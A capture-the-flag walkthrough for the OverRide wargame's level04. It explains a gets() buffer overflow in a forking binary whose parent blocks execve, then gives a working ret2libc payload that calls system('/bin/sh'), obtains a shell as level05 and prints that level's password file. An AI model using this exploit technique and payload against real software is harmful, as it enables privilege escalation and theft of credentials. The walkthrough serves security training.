# Level 04 Walkthrough

Via running the program we see that it asks for an input
```
level04@OverRide:~$ ./level04
Give me some shellcode, k
our input
child is exiting...
```

When disassembled, we can see the program forks, with the child process handling input reading.
```
...
   0x080486d6 <+14>:    call   0x8048550 <fork@plt>
   0x080486db <+19>:    mov    DWORD PTR [esp+0xac],eax         // fork return value; parent gets PID of the child, child gets zero, on error -1 is returned
   0x080486e2 <+26>:    lea    ebx,[esp+0x20]                   // a buffer
...
   0x08048709 <+65>:    cmp    DWORD PTR [esp+0xac],0x0         // verifies if it's the child
   0x08048711 <+73>:    jne    0x8048769 <main+161>

   -----------------------------------------------------
                        CHILD CODE
   -----------------------------------------------------
   0x08048713 <+75>:    mov    DWORD PTR [esp+0x4],0x1          // 0x1 = is the signal the child process will get when the parent process dies
   0x0804871b <+83>:    mov    DWORD PTR [esp],0x1              // 0x1 = PR_SET_PDEATHSIG
   0x08048722 <+90>:    call   0x8048540 <prctl@plt>
   0x08048727 <+95>:    mov    DWORD PTR [esp+0xc],0x0          // The data is ignored
   0x0804872f <+103>:   mov    DWORD PTR [esp+0x8],0x0          // The addr is ignored
   0x08048737 <+111>:   mov    DWORD PTR [esp+0x4],0x0          // The PID is ignored
   0x0804873f <+119>:   mov    DWORD PTR [esp],0x0              // PTRACE_TRACEME; Indicate that the process making this request should be traced
   0x08048746 <+126>:   call   0x8048570 <ptrace@plt>           // long ptrace(enum __ptrace_request request, pid_t pid,void *addr, void *data);
   0x0804874b <+131>:   mov    DWORD PTR [esp],0x8048903        // 0x8048903:       "Give me some shellcode, k"
   0x08048752 <+138>:   call   0x8048500 <puts@plt>
   0x08048757 <+143>:   lea    eax,[esp+0x20]
   0x0804875b <+147>:   mov    DWORD PTR [esp],eax
   0x0804875e <+150>:   call   0x80484b0 <gets@plt>             // gets function is used indicating a buffer overflow vulnerability
   0x08048763 <+155>:   jmp    0x804881a <main+338>
```

Here the parent will trace its child whenever it invokes a syscall, the parent then will verify which syscall was invoked if it's a `execve` which makes the parent send a `SIGKILL` to the child to end its execution. 
```
   -----------------------------------------------------
                        THE PARENT
   -----------------------------------------------------
   0x08048768 <+160>:   nop
   0x08048769 <+161>:   lea    eax,[esp+0x1c]
   0x0804876d <+165>:   mov    DWORD PTR [esp],eax
   0x08048770 <+168>:   call   0x80484f0 <wait@plt>
... 
   0x080487ba <+242>:   mov    DWORD PTR [esp+0xc],0x0          // The data argument is ignored
   0x080487c2 <+250>:   mov    DWORD PTR [esp+0x8],0x2c         // 0x2c = 44 Is the offset addr in the tracee's USER area https://android.googlesource.com/platform/bionic/+/5930772/libc/include/sys/user.h#67
   0x080487ca <+258>:   mov    eax,DWORD PTR [esp+0xac]
   0x080487d1 <+265>:   mov    DWORD PTR [esp+0x4],eax          // Child's PID
   0x080487d5 <+269>:   mov    DWORD PTR [esp],0x3              // PTRACE_PEEKUSER; Return the word in the process's user area at offset ADDR.
   0x080487dc <+276>:   call   0x8048570 <ptrace@plt>
   0x080487e1 <+281>:   mov    DWORD PTR [esp+0xa8],eax         // The value we want the `orig_eax` which usually contains the syscall number to be invoked
   0x080487e8 <+288>:   cmp    DWORD PTR [esp+0xa8],0xb         // Comparing the `orig_eax` against 11 which is the syscall number for `execve`
   0x080487f0 <+296>:   jne    0x8048768 <main+160>
   0x080487f6 <+302>:   mov    DWORD PTR [esp],0x8048931        // 0x8048931:       "no exec() for you"
   0x080487fd <+309>:   call   0x8048500 <puts@plt>
   0x08048802 <+314>:   mov    DWORD PTR [esp+0x4],0x9
   0x0804880a <+322>:   mov    eax,DWORD PTR [esp+0xac]
   0x08048811 <+329>:   mov    DWORD PTR [esp],eax
   0x08048814 <+332>:   call   0x8048520 <kill@plt>
   0x08048819 <+337>:   nop
   0x0804881a <+338>:   mov    eax,0x0
   0x0804881f <+343>:   lea    esp,[ebp-0x8]
   0x08048822 <+346>:   pop    ebx
   0x08048823 <+347>:   pop    edi
   0x08048824 <+348>:   pop    ebp
   0x08048825 <+349>:   ret
End of assembler dump.
```

So we can't exploit the program via a shellcode because it calls `execve`, instead we'll use `system`,
```
level04@OverRide:~$ ldd ./level04
                    libc.so.6 => /lib32/libc.so.6 (0xf7e4e000)

level04@OverRide:~$ readelf -s /lib32/libc.so.6 | grep system
                    1422: 0003eed0   141 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0

level04@OverRide:~$ strings -a -t x /lib32/libc.so.6 | grep "/bin/sh"
                    15d7ec /bin/sh

160 Bytes is the difference between the buffer in the stack and the main's return address 

glibc base address 0xf7e2c000
system           : 0xf7e6aed0
"/bin/sh"        : 0xf7f897ec
```

```
level04@OverRide:~$ (python -c 'import struct; print "A"*156+struct.pack("I", 0xf7e6aed0)+"AAAA"+struct.pack("I", 0xf7f897ec)'; cat) | ./level04
Give me some shellcode, k
id
uid=1004(level04) gid=1004(level04) euid=1005(level05) egid=100(users) groups=1005(level05),100(users),1004(level04)

cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```